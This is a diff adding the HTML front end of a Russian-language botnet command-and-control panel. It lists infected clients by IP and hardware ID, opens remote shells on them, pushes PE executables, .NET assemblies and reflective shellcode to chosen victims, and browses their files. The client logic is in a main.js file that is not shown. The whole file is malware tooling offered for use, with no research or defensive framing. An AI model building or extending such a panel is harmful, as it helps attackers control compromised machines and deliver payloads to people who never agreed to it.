@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>C2 panel</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <h1>Panel</h1>
+
+  <section>
+    <h2>Client list</h2>
+    <table id="bots">
+      <thead>
+        <tr>
+          <th>IP</th>
+          <th>HWID</th>
+          <th>Last Signal</th>
+          <th>Shell</th>
+          <th>Connect</th>
+          <th>Ban</th>
+        </tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+  </section>
+
+  <section id="terminal" style="display:none;">
+    <h2>Remote Shell: <span id="term-ip"></span></h2>
+    <pre id="term-output" style="background:#000; color:#0f0; height:300px; overflow:auto;"></pre>
+    <input id="term-input"
+           style="width:100%; box-sizing:border-box; padding:0.5rem; margin-top:0.5rem;"
+           placeholder="Введите команду и нажмите Enter" />
+    <button onclick="closeShell()">Close Shell</button>
+  </section>
+
+  <section>
+    <h2>Payload PE</h2>
+    <div>
+      <label>IP: <input id="payload-ip" /></label>
+      <label>Path: <input type="file" id="payload-file" /></label>
+      <button onclick="sendPayload()">Send PE</button>
+    </div>
+    <pre id="payload-status"></pre>
+  </section>
+
+  <section>
+    <h2>.NET</h2>
+    <div>
+      <label>IP: <input id="dotnet-ip" /></label>
+      <label>Path: <input type="file" id="dotnet-file" /></label>
+      <button onclick="sendDotnet()">Send .NET</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>Reflective Shellcode</h2>
+    <div>
+      <label>IP: <input id="reflective-ip" /></label>
+      <label>Path: <input type="file" id="reflective-file" /></label>
+      <button onclick="sendReflective()">Send Reflective</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>File Manager</h2>
+    <div>
+      <label>Path: <input id="fm-path" value="." /></label>
+      <button onclick="listFiles()">Update</button>
+    </div>
+    <ul id="files"></ul>
+  </section>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="main.js"></script>
+</body>
+</html>
